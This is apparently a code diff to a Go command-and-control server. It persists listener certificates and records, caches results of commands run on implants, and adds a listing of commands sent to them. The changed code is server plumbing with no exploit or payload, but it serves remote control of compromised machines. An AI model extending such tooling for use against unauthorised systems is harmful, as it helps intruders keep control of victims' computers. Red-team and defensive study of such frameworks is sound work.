@@ -145,14 +145,10 @@ func (s *C2Server) BeaconStream(stream pb.C2Service_BeaconStreamServer) error {
 		// Process beacon message
 		switch msg.Type {
 		case pb.BeaconMessage_HEARTBEAT:
-			if session != nil {
-				logrus.Infof("Heartbeat from %s (%s@%s)", msg.ImplantId, session.Username, session.Hostname)
-			} else {
-				logrus.Infof("Heartbeat from %s", msg.ImplantId)
-			}
+			// Heartbeat received - last seen already updated above
 		case pb.BeaconMessage_TASK_RESULT:
 			// Parse result payload: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
-			s.parseAndStoreCommandResult(string(msg.Payload))
+			s.parseAndStoreCommandResult(string(msg.Payload), msg.ImplantId)
 		case pb.BeaconMessage_ERROR:
 			logrus.Errorf("Error from %s: %s", msg.ImplantId, string(msg.Payload))
 		case pb.BeaconMessage_LOG:
@@ -221,7 +217,8 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 	} else {
 		payload = fmt.Sprintf("%s|false|%s", result.TaskId, result.Error)
 	}
-	s.parseAndStoreCommandResult(payload)
+	// parseAndStoreCommandResult handles both storage and task completion notifications
+	s.parseAndStoreCommandResult(payload, result.ImplantId)
 
 	return &pb.TaskAck{
 		Received: true,
@@ -344,6 +341,9 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 	serverOptions = append(serverOptions, grpc.KeepaliveEnforcementPolicy(kaep), grpc.KeepaliveParams(kasp))
 	var g *grpc.Server
 
+	// Generate listener ID first so we can use it for persistent certificate naming
+	id := fmt.Sprintf("lst_%d", time.Now().UnixNano())
+
 	switch req.Type {
 	case pb.ListenerType_LISTENER_HTTP:
 		// No TLS
@@ -354,27 +354,24 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 		var cert tls.Certificate
 
 		if req.Type == pb.ListenerType_LISTENER_MTLS {
-			// For mTLS, automatically generate CA-signed server certificate
-			cert, err = s.caManager.GenerateServerCertificate(addr)
+			// For mTLS, load or generate persistent CA-signed server certificate
+			cert, err = s.caManager.LoadOrGenerateServerCertificate(id, addr)
 			if err != nil {
 				_ = ln.Close()
-				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to generate mTLS server certificate: %v", err)}, nil
+				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to load/generate mTLS server certificate: %v", err)}, nil
 			}
-			logrus.Infof("Generated CA-signed server certificate for mTLS listener %s", addr)
+			logrus.Infof("Loaded persistent CA-signed server certificate for mTLS listener %s", addr)
 		} else {
-			// For HTTPS, try to load existing certs first, then fallback to self-signed
+			// For HTTPS, try to load existing certs first, then fallback to persistent CA-signed
 			cert, err = tls.LoadX509KeyPair(certPath, keyPath)
 			if err != nil {
-				// Generate self-signed certificate if not found or invalid
-				host, _, _ := net.SplitHostPort(addr)
-				if host == "" {
-					host = "localhost"
-				}
-				cert, err = generateSelfSignedCertWithIP(host, addr)
+				// Load or generate persistent CA-signed certificate
+				cert, err = s.caManager.LoadOrGenerateServerCertificate("https-"+id, addr)
 				if err != nil {
 					_ = ln.Close()
-					return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("TLS self-sign failed: %v", err)}, nil
+					return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to load/generate HTTPS server certificate: %v", err)}, nil
 				}
+				logrus.Infof("Loaded persistent CA-signed server certificate for HTTPS listener %s", addr)
 			}
 		}
 
@@ -396,18 +393,16 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 		serverOptions = append(serverOptions, grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
 		g = grpc.NewServer(serverOptions...)
 	default:
-		// Default to HTTPS
+		// Default to HTTPS with persistent certificates
 		cert, err := tls.LoadX509KeyPair(certPath, keyPath)
 		if err != nil {
-			host, _, _ := net.SplitHostPort(addr)
-			if host == "" {
-				host = "localhost"
-			}
-			cert, err = generateSelfSignedCertWithIP(host, addr)
+			// Load or generate persistent CA-signed certificate
+			cert, err = s.caManager.LoadOrGenerateServerCertificate("default-"+id, addr)
 			if err != nil {
 				_ = ln.Close()
-				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("TLS self-sign failed: %v", err)}, nil
+				return &pb.ListenerAddResponse{Success: false, Message: fmt.Sprintf("Failed to load/generate default server certificate: %v", err)}, nil
 			}
+			logrus.Infof("Loaded persistent CA-signed server certificate for default listener %s", addr)
 		}
 		creds := credentials.NewTLS(&tls.Config{Certificates: []tls.Certificate{cert}, ClientAuth: tls.NoClientCert})
 		serverOptions = append(serverOptions, grpc.Creds(creds), grpc.MaxRecvMsgSize(64<<20), grpc.MaxSendMsgSize(64<<20))
@@ -417,10 +412,12 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 	// Create a dedicated gRPC server bound to same service state
 	pb.RegisterC2ServiceServer(g, s)
 
-	id := fmt.Sprintf("lst_%d", time.Now().UnixNano())
 	l := &Listener{ID: id, Address: addr, StartedAt: time.Now(), ln: ln, srv: g, Type: req.Type}
 
-	// Note: Listeners are no longer saved to database to prevent persistence issues
+	// Save listener to database for persistence across restarts
+	if err := s.db.SaveListener(id, addr, req.Type.String(), certPath, keyPath, req.CaFile); err != nil {
+		logrus.Warnf("Failed to save listener to database: %v", err)
+	}
 
 	s.listenersMux.Lock()
 	s.listeners[id] = l
@@ -429,7 +426,7 @@ func (s *C2Server) AddListener(ctx context.Context, req *pb.ListenerAddRequest) 
 	go func() {
 		if err := g.Serve(ln); err != nil {
 			logrus.Errorf("Listener %s serve error: %v", id, err)
-			// Note: Listener status no longer tracked in database
+			s.db.UpdateListenerStatus(id, "failed")
 		}
 	}()
 
@@ -458,7 +455,10 @@ func (s *C2Server) RemoveListener(ctx context.Context, req *pb.ListenerRemoveReq
 		_ = l.ln.Close()
 		delete(s.listeners, req.Id)
 
-		// Note: Listeners are no longer tracked in database
+		// Update listener status in database
+		if err := s.db.UpdateListenerStopped(req.Id); err != nil {
+			logrus.Warnf("Failed to update listener status in database: %v", err)
+		}
 	}
 	s.listenersMux.Unlock()
 	if !ok {
@@ -796,6 +796,23 @@ func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRe
 	result, exists := s.commandResults[req.CommandId]
 	s.resultsMux.RUnlock()
 
+	// If not in memory, check database first
+	if !exists {
+		dbResult, err := s.db.GetCommandResult(req.CommandId)
+		if err == nil && dbResult != nil {
+			// Found in database, use it and cache it
+			result = dbResult
+			exists = true
+
+			s.resultsMux.Lock()
+			s.commandResults[req.CommandId] = dbResult
+			s.resultsMux.Unlock()
+
+			logrus.Infof("Retrieved command result from database: %s", req.CommandId)
+		}
+	}
+
+	// If still not found, return not found
 	if !exists {
 		return &pb.CommandResultResponse{
 			Ready:   false,
@@ -821,31 +838,18 @@ func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRe
 				}
 			}
 		}
-	}
 
-	// If still pending after timeout or not found in memory, check database as fallback
-	if !exists || result.Error == "Pending..." {
-		dbResult, err := s.db.GetCommandResult(req.CommandId)
-		if err == nil && dbResult != nil {
-			// Found in database, use it
-			result = dbResult
-			exists = true
+		// If still pending after timeout, check database again
+		if result.Error == "Pending..." {
+			dbResult, err := s.db.GetCommandResult(req.CommandId)
+			if err == nil && dbResult != nil && dbResult.Error != "Pending..." {
+				result = dbResult
 
-			// Also update in-memory cache for future requests
-			s.resultsMux.Lock()
-			s.commandResults[req.CommandId] = dbResult
-			s.resultsMux.Unlock()
-
-			logrus.Infof("Retrieved command result from database: %s", req.CommandId)
+				s.resultsMux.Lock()
+				s.commandResults[req.CommandId] = dbResult
+				s.resultsMux.Unlock()
+			}
 		}
-	}
-
-	if !exists {
-		return &pb.CommandResultResponse{
-			Ready:   false,
-			Success: false,
-			Error:   "Command not found",
-		}, nil
 	}
 
 	ready := result.Error != "Pending..."
@@ -855,6 +859,46 @@ func (s *C2Server) GetCommandResult(ctx context.Context, req *pb.CommandResultRe
 		Output:  result.Output,
 		Error:   result.Error,
 	}, nil
+}
+
+func (s *C2Server) ListCommands(ctx context.Context, req *pb.CommandListRequest) (*pb.CommandListResponse, error) {
+	var dbCommands []DBCommand
+	var err error
+
+	limit := int(req.Limit)
+	if limit <= 0 {
+		limit = 100
+	}
+
+	if req.ImplantId != "" {
+		dbCommands, err = s.db.GetCommandsByImplant(req.ImplantId, limit)
+	} else {
+		dbCommands, err = s.db.GetRecentCommands(limit)
+	}
+
+	if err != nil {
+		return nil, fmt.Errorf("failed to fetch commands: %v", err)
+	}
+
+	var commands []*pb.CommandInfo
+	for _, cmd := range dbCommands {
+		// Calculate completed time (approximate based on update updated_at if we had it, or just leave 0 for pending)
+		// For now we just return CreatedAt.
+		// Detailed status check
+
+		info := &pb.CommandInfo{
+			CommandId: cmd.CommandID,
+			ImplantId: cmd.ImplantID,
+			Type:      cmd.Type,
+			Command:   cmd.Command,
+			Status:    cmd.Status,
+			CreatedAt: cmd.CreatedAt.Unix(),
+			// CompletedAt can be populated if status is completed/failed
+		}
+		commands = append(commands, info)
+	}
+
+	return &pb.CommandListResponse{Commands: commands}, nil
 }
 
 func (s *C2Server) PTYStream(stream pb.C2Service_PTYStreamServer) error {
